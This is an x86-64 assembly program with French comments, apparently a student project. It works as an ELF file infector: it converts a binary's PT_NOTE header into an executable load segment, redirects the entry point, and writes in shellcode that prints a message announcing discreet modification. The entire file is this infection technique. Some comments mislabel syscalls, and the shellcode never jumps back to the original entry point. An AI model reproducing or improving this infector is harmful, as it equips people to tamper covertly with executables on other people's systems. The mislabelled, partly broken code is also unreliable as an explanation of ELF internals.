section .data
; Messages de retour pour les erreurs ou succès
msg_not_elf_new db "Ce fichier n'est pas un ELF compatible.",0xA  ; Message si le fichier n'est pas un ELF
len_not_elf_new equ $ - msg_not_elf_new  ; Calcul de la longueur du message

msg_dir_new db "C'est un dossier, operation impossible.",0xA  ; Message si le fichier est un dossier
len_dir_new equ $ - msg_dir_new  ; Longueur du message

msg_usage_new db "Usage: ./projet <filename>",0xA  ; Message d'usage du programme
len_usage_new equ $ - msg_usage_new  ; Longueur du message

msg_open_err_new db "Impossible d'ouvrir ce fichier.",0xA  ; Message d'erreur d'ouverture de fichier
len_open_err_new equ $ - msg_open_err_new  ; Longueur du message

msg_ok_new db "Fichier modifie avec succes!",0xA  ; Message de succès de modification de fichier
len_ok_new equ $ - msg_ok_new  ; Longueur du message

section .bss
; Déclaration de variables pour la manipulation du fichier ELF
magic_area resb 4  ; Zone mémoire pour stocker les 4 premiers octets du fichier (magique ELF)
info_stat resb 144  ; Zone pour stocker les informations de statut du fichier (stat)
elf_buf resb 64  ; Tampon pour stocker des informations spécifiques de l'en-tête ELF
ph_buf resb 56  ; Tampon pour les informations de header de programme
ph_off resq 1  ; Offset de l'en-tête de programme
ph_esize resw 1  ; Taille de l'en-tête de programme
ph_count resw 1  ; Nombre d'entrées dans l'en-tête de programme
cur_ofs resq 1  ; Offset actuel dans le fichier
fd_sav resq 1  ; Sauvegarde du descripteur de fichier
nt_ofs resq 1  ; Offset de l'en-tête du noyau
nt_found resb 1  ; Indicateur si un noyau est trouvé
o_entry resq 1  ; Adresse d'entrée du programme ELF
vmax_end resq 1  ; Adresse de fin de la zone mémoire maximale

section .data.shellcode
; Code qui s'exécute en cas de modification de contenu du fichier ELF
shellcode:
    lea rbx, [rel infection_msg]  ; Charger l'adresse du message de l'infection dans rbx
    sub rbx, infmsg_off  ; Ajuster l'adresse du message
    mov rax,1  ; Syscall pour écrire (write)
    mov rdi,1  ; Sortie vers stdout
    lea rsi,[rbx + infmsg_off]  ; Charger l'adresse du message dans rsi
    mov rdx,infmsg_len  ; Longueur du message
    syscall  ; Exécution du syscall (écriture)
    mov r15,[rbx + oent_off]  ; Charger l'adresse de l'entrée originale
    mov rcx,[rbx + pvaddr_off]  ; Charger l'adresse virtuelle dans rcx
    sub rbx,rcx  ; Ajuster l'adresse de rbx en fonction de l'adresse virtuelle
    add r15,rbx  ; Ajouter à l'adresse de l'entrée

; Définition du message d'infection et de sa longueur
infection_msg db "Le contenu a ete ajuste discretement!",0xA
infmsg_len equ $ - infection_msg  ; Longueur du message

; Définition des offsets dans le shellcode pour les adresses utilisées
orig_str dq 0
pvaddr_str dq 0
shell_end:
infmsg_off equ infection_msg - shellcode  ; Calcul de l'offset du message d'infection
oent_off equ orig_str - shellcode  ; Offset pour l'entrée originale
pvaddr_off equ pvaddr_str - shellcode  ; Offset pour l'adresse virtuelle
sc_size equ shell_end - shellcode  ; Taille du shellcode

section .text
global _start
_start:
    ; Empilement et désempilement des arguments
    pop rax
    cmp rax,2  ; Vérifie le nombre d'arguments (attend deux arguments)
    jl usage_mix  ; Si moins de 2 arguments, affiche l'usage

    pop rax
    pop rdi  ; Sauvegarde le nom du fichier dans rdi

    ; Appel au syscall 'stat' pour obtenir les informations du fichier
    mov rax,4  ; Syscall pour 'stat'
    lea rsi,[info_stat]  ; Adresse de la structure de statut
    syscall
    cmp rax,0  ; Vérifie si le fichier a été ouvert avec succès
    jne err_open  ; Si échec, aller à l'erreur d'ouverture

    ; Vérification si le fichier est un dossier (type 2)
    mov rax,[info_stat+16]  ; Récupère le type de fichier
    cmp rax,2  ; Compare avec 2 (dossier)
    je dir_mix  ; Si c'est un dossier, afficher un message spécifique

    ; Si c'est un fichier valide, ouvrir le fichier ELF
    mov rax,2  ; Syscall pour ouvrir un fichier
    mov rsi,2  ; Ouvrir en lecture seule
    syscall
    cmp rax,0  ; Vérifie si l'ouverture est réussie
    jl err_open  ; Si échec, afficher une erreur

    ; Sauvegarder le descripteur de fichier
    mov [fd_sav],rax

    ; Lire les premiers 4 octets pour vérifier le header ELF
    mov rax,0  ; Syscall pour lire le fichier
    mov rdi,[fd_sav]  ; Descripteur de fichier sauvegardé
    mov rsi,magic_area  ; Adresse de la zone de lecture
    mov rdx,4  ; Lire 4 octets
    syscall
    cmp rax,4  ; Vérifie que 4 octets ont bien été lus
    jne not_elf_m  ; Si ce n'est pas ELF, affiche un message

    ; Vérifier la signature ELF (0x464C457F)
    mov eax,dword [magic_area]  ; Charger les 4 octets du magic number
    cmp eax,0x464C457F  ; Comparer avec la signature ELF
    jne not_elf_m  ; Si ce n'est pas un ELF, afficher un message

    ; Lire l'en-tête ELF et les informations de programme
    mov rax,8  ; Syscall pour lire les 8 premiers octets de l'en-tête
    mov rdi,[fd_sav]  ; Descripteur de fichier
    xor rsi,rsi  ; Réinitialiser rsi
    xor rdx,rdx  ; Réinitialiser rdx
    syscall
    cmp rax,-1  ; Vérifie s'il y a une erreur
    je err_open  ; Si erreur, afficher une erreur

    ; Lire les données ELF (64 octets)
    mov rax,0  ; Syscall pour lire à nouveau
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[elf_buf]  ; Adresse de lecture
    mov rdx,64  ; Nombre d'octets à lire
    syscall
    cmp rax,64  ; Vérifie que la lecture est complète
    jne err_open  ; Si échec, afficher une erreur

    ; Récupérer les informations de l'en-tête ELF
    mov rax,qword [elf_buf+0x20]  ; Offset du programme
    mov [ph_off],rax
    movzx eax,word [elf_buf+0x38]  ; Nombre d'entrées dans l'en-tête
    mov [ph_count],ax
    movzx eax,word [elf_buf+0x36]  ; Taille des entrées
    mov [ph_esize],ax
    mov rax,[elf_buf+24]  ; Adresse d'entrée du programme ELF
    mov [o_entry],rax

    ; Initialisation pour parcourir les en-têtes de programme
    movzx r12,word [ph_count]
    mov rsi,[ph_off]  ; Offset des entrées
    mov [cur_ofs],rsi
    mov rax,0  ; Réinitialiser rax
    mov [vmax_end],rax  ; Initialisation de la fin maximale

    ; Sauvegarde des registres avant de manipuler des données
    push rbx
    push rcx
    push rdx
    nop  ; Aucune opération, utilisée comme remplissage
    xor rdx,rdx  ; Réinitialiser rdx
    pop rdx  ; Restauration de rdx
    pop rcx  ; Restauration de rcx
    pop rbx  ; Restauration de rbx
    nop  ; Aucune opération
scan_load_and_note:
    cmp r12,0  ; Comparer la valeur de r12 (nombre de segments à traiter) avec 0
    je after_load_scan  ; Si r12 est égal à 0, aller à la section après le scan

read_ph:
    ; Lire les entêtes de programme (ph) à partir du fichier ELF
    mov rax,8  ; Syscall pour lire
    mov rdi,[fd_sav]  ; Descripteur de fichier sauvegardé
    mov rsi,[cur_ofs]  ; Offset actuel dans le fichier
    xor rdx,rdx  ; Réinitialiser rdx (taille du buffer)
    syscall  ; Effectuer l'appel système
    mov rax,0  ; Réinitialiser rax
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[ph_buf]  ; Adresse du tampon pour l'entête de programme
    movzx rdx, word [ph_esize]  ; Taille de l'entête de programme
    syscall  ; Effectuer l'appel système
    mov eax,dword [ph_buf]  ; Lire le type d'entrée (premiers 4 octets)
    cmp eax,1  ; Vérifier si c'est un programme (type 1)
    jne skip_load_upd  ; Si ce n'est pas un programme, passer à l'étape suivante
    ; Calcul de la nouvelle fin maximale du segment
    mov rax,[ph_buf+16]  ; Charger l'adresse du segment
    mov rbx,[ph_buf+40]  ; Charger la taille du segment
    add rax,rbx  ; Additionner pour obtenir l'adresse de fin du segment
    cmp rax,[vmax_end]  ; Comparer avec l'adresse de fin maximale actuelle
    jbe skip_load_upd  ; Si l'adresse est inférieure ou égale, passer à l'étape suivante
    mov [vmax_end],rax  ; Mettre à jour la fin maximale du segment

skip_load_upd:
    movzx rax,word [ph_esize]  ; Charger la taille de l'entête de programme
    mov rsi,[cur_ofs]  ; Charger l'offset actuel
    add rsi,rax  ; Ajouter la taille de l'entête pour obtenir le prochain offset
    mov [cur_ofs],rsi  ; Mettre à jour l'offset actuel
    dec r12  ; Décrémenter le compteur de segments à traiter
    cmp r12,0  ; Comparer r12 à 0 pour savoir s'il reste des segments
    jne read_ph  ; Si ce n'est pas 0, répéter la lecture des entêtes

after_load_scan:
    ; À ce point, tous les entêtes ont été chargés
    mov rsi,[ph_off]  ; Charger l'offset de l'entête de programme
    mov [cur_ofs],rsi  ; Mettre à jour l'offset actuel
    movzx r12, word [ph_count]  ; Charger le nombre d'entrées de programme
    mov byte [nt_found],0  ; Initialiser le drapeau de note trouvée à 0

find_note_mix:
    cmp r12,0  ; Vérifier s'il y a encore des entrées à traiter
    je no_nt_found_m  ; Si 0, aller à la section "no_nt_found_m"
nt_loop_m:
    ; Lire les entêtes de programme pour rechercher la section note
    mov rax,8  ; Syscall pour lire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    mov rsi,[cur_ofs]  ; Offset actuel
    xor rdx,rdx  ; Réinitialiser rdx (taille du buffer)
    syscall  ; Effectuer l'appel système
    mov rax,0  ; Réinitialiser rax
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[ph_buf]  ; Adresse du tampon pour l'entête de programme
    movzx rdx, word [ph_esize]  ; Taille de l'entête de programme
    syscall  ; Effectuer l'appel système
    mov eax,dword [ph_buf]  ; Lire le type d'entrée (premiers 4 octets)
    cmp eax,4  ; Vérifier si c'est une note (type 4)
    jne next_phb_m  ; Si ce n'est pas une note, passer à l'entrée suivante
    ; Si c'est une note, enregistrer l'offset
    mov rax,[cur_ofs]  ; Charger l'offset actuel
    mov [nt_ofs],rax  ; Sauvegarder l'offset de la note
    mov byte [nt_found],1  ; Marquer que la note a été trouvée
    jmp have_nt_m  ; Passer à la section "have_nt_m"

next_phb_m:
    movzx rax,word [ph_esize]  ; Charger la taille de l'entête de programme
    mov rsi,[cur_ofs]  ; Charger l'offset actuel
    add rsi,rax  ; Ajouter la taille de l'entête pour obtenir le prochain offset
    mov [cur_ofs],rsi  ; Mettre à jour l'offset actuel
    dec r12  ; Décrémenter le compteur d'entrées
    jmp find_note_mix  ; Rechercher la note dans le prochain segment

no_nt_found_m:
    jmp close_end_mix  ; Si aucune note n'est trouvée, fermer l'opération

have_nt_m:
    mov al,[nt_found]  ; Vérifier si une note a été trouvée
    cmp al,0  ; Si la note n'a pas été trouvée, aller à "close_end_mix"
    je close_end_mix
    nop  ; Aucune opération, utilisée pour du remplissage

    ; Si la note a été trouvée, modifier son contenu
    mov rax,8  ; Syscall pour lire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    mov rsi,[nt_ofs]  ; Offset de la note
    xor rdx,rdx  ; Réinitialiser rdx
    syscall  ; Effectuer l'appel système
    mov rax,0  ; Réinitialiser rax
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[ph_buf]  ; Adresse du tampon pour la note
    movzx rdx, word [ph_esize]  ; Taille de l'entête de programme
    syscall  ; Effectuer l'appel système
    mov rax,8  ; Syscall pour lire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    xor rsi,rsi  ; Réinitialiser rsi
    mov rdx,2  ; Lire 2 octets
    syscall  ; Effectuer l'appel système

    ; Modifier le contenu de la note avec un shellcode
    mov r15,rax  ; Charger l'adresse de la note dans r15
    xor rcx,rcx  ; Réinitialiser rcx
    add r15,0xFFF  ; Ajouter un offset pour aligner l'adresse
    and r15,0xFFFFFFFFFFFFF000  ; Aligner sur la page mémoire
    mov r14,r15  ; Sauvegarder l'adresse alignée

    ; Sauvegarder l'état du registre rsp
    sub rsp,56  ; Réserver de l'espace pour la copie de données
    mov rcx,56  ; Taille du buffer
    mov rsi,ph_buf  ; Source des données
    mov rdi,rsp  ; Destination pour la copie
    rep movsb  ; Copie les données
    mov dword [ph_buf],1  ; Modifier les valeurs dans ph_buf
    mov dword [ph_buf+4],5
    mov qword [ph_buf+8],r14  ; Nouvelle adresse dans ph_buf
    mov rax,[vmax_end]  ; Charger la fin maximale du segment
    add rax,0xFFF  ; Ajouter un offset pour aligner l'adresse
    and rax,0xFFFFFFFFFFFFF000  ; Aligner sur la page mémoire
    add rax,0x400000  ; Ajouter un offset pour un espace réservé
    mov qword [ph_buf+16],rax  ; Mettre à jour l'adresse du segment
    mov qword [ph_buf+24],rax  ; Mettre à jour l'adresse de destination
    mov rax,sc_size  ; Taille du shellcode
    mov qword [ph_buf+32],rax
    mov qword [ph_buf+40],rax
    mov qword [ph_buf+48],0x1000  ; Taille de la page mémoire
    mov rax,qword [ph_buf+16]  ; Charger l'adresse mise à jour
    mov [elf_buf+24],rax  ; Mettre à jour l'adresse d'entrée dans elf_buf

    ; Écrire les modifications dans le fichier ELF
    mov rax,8  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    xor rsi,rsi  ; Réinitialiser rsi
        xor rdx,rdx  ; Réinitialiser rdx (taille du buffer)
    syscall  ; Effectuer l'appel système (écriture dans le fichier ELF)
    
    mov rax,1  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[elf_buf]  ; Adresse du buffer ELF
    mov rdx,64  ; Taille du buffer ELF
    syscall  ; Effectuer l'appel système (écriture dans le fichier ELF)
    
    mov rax,8  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    mov rsi,[nt_ofs]  ; Offset de la note
    xor rdx,rdx  ; Réinitialiser rdx
    syscall  ; Effectuer l'appel système (écriture dans le fichier ELF)
    
    mov rax,1  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    lea rsi,[ph_buf]  ; Adresse du buffer contenant la note
    mov rdx,56  ; Taille du buffer (56 octets)
    syscall  ; Effectuer l'appel système (écriture dans le fichier ELF)
    
    mov rax,[o_entry]  ; Charger l'adresse de l'entrée dans l'ELF
    mov rdi,shellcode  ; Charger l'adresse du shellcode
    add rdi,oent_off  ; Ajouter l'offset pour l'entrée
    mov [rdi],rax  ; Mettre à jour l'entrée avec l'adresse d'entrée modifiée
    
    mov rax,[ph_buf+16]  ; Charger l'adresse du segment modifié
    mov rdi,shellcode  ; Charger l'adresse du shellcode
    add rdi,pvaddr_off  ; Ajouter l'offset pour l'adresse virtuelle
    mov [rdi],rax  ; Mettre à jour l'adresse virtuelle dans le shellcode
    
    mov rax,8  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    mov rsi,r14  ; Adresse virtuelle alignée du segment
    xor rdx,rdx  ; Réinitialiser rdx
    syscall  ; Effectuer l'appel système (écriture dans le fichier ELF)
    
    mov rax,1  ; Syscall pour écrire
    mov rdi,[fd_sav]  ; Descripteur de fichier
    mov rsi,shellcode  ; Charger l'adresse du shellcode
    mov rdx,sc_size  ; Taille du shellcode
    syscall  ; Effectuer l'appel système (écriture du shellcode dans le fichier ELF)
    
    add rsp,56  ; Restaurer l'espace réservé pour la copie de données
    nop  ; Aucune opération, remplissage
    
    mov rax,1  ; Syscall pour écrire un message de succès
    mov rdi,1  ; Sortie standard (stdout)
    lea rsi,[msg_ok_new]  ; Message de succès
    mov rdx,len_ok_new  ; Taille du message
    syscall  ; Effectuer l'appel système pour afficher le message

    ; Afficher le shellcode avant le segfault
    mov rax,1  ; Syscall pour écrire
    mov rdi,1  ; Sortie standard (stdout)
    mov rsi,shellcode  ; Charger l'adresse du shellcode
    mov rdx,sc_size  ; Taille du shellcode
    syscall  ; Effectuer l'appel système pour afficher le shellcode

    ; Provoquer une erreur de segmentation (segfault)
    ; On ajoute un offset énorme à l'adresse du shellcode pour provoquer un crash
    mov rax, shellcode  ; Charger l'adresse du shellcode
    add rax, 0xFFFFFFFFFFFF0000  ; Ajouter un offset invalide (adresse hors de portée)
    mov rbx, [rax]  ; Essayer de lire à une adresse invalide, ce qui provoque un segfault

    jmp close_end_mix  ; Fin du programme, fermer proprement
not_elf_m:
    ; Message indiquant que le fichier n'est pas un ELF valide
    mov rax,1  ; Code syscall pour écrire sur la sortie standard
    mov rdi,1  ; Sortie standard (stdout)
    lea rsi,[msg_not_elf_new]  ; Adresse du message "Ce fichier n'est pas un ELF compatible."
    mov rdx,len_not_elf_new  ; Longueur du message
    syscall  ; Appel système pour afficher le message
    jmp close_end_mix  ; Saut à la fin du programme, fermeture du fichier et nettoyage

dir_mix:
    ; Message indiquant que l'entrée est un dossier, pas un fichier
    mov rax,1  ; Code syscall pour écrire sur la sortie standard
    mov rdi,1  ; Sortie standard (stdout)
    lea rsi,[msg_dir_new]  ; Adresse du message "C'est un dossier, operation impossible."
    mov rdx,len_dir_new  ; Longueur du message
    syscall  ; Appel système pour afficher le message
    jmp end_exit_mix  ; Saut à la fin du programme

usage_mix:
    ; Message d'usage du programme
    mov rax,1  ; Code syscall pour écrire sur la sortie standard
    mov rdi,1  ; Sortie standard (stdout)
    lea rsi,[msg_usage_new]  ; Adresse du message "Usage: ./projet <filename>"
    mov rdx,len_usage_new  ; Longueur du message
    syscall  ; Appel système pour afficher le message
    jmp end_exit_mix  ; Saut à la fin du programme

err_open:
    ; Message d'erreur si l'ouverture du fichier échoue
    mov rax,1  ; Code syscall pour écrire sur la sortie standard
    mov rdi,1  ; Sortie standard (stdout)
    lea rsi,[msg_open_err_new]  ; Adresse du message "Impossible d'ouvrir ce fichier."
    mov rdx,len_open_err_new  ; Longueur du message
    syscall  ; Appel système pour afficher le message
    jmp end_exit_mix  ; Saut à la fin du programme

close_end_mix:
    ; Ferme le fichier si ouvert
    mov rax,3  ; Code syscall pour fermer un fichier
    mov rdi,[fd_sav]  ; Descripteur de fichier
    syscall  ; Appel système pour fermer le fichier
    jmp end_exit_mix  ; Saut à la fin du programme

end_exit_mix:
    ; Terminer le programme proprement
    mov rax,60  ; Code syscall pour quitter un programme
    xor rdi,rdi  ; Code de retour 0 (exit code)
    syscall  ; Appel système pour quitter le programme

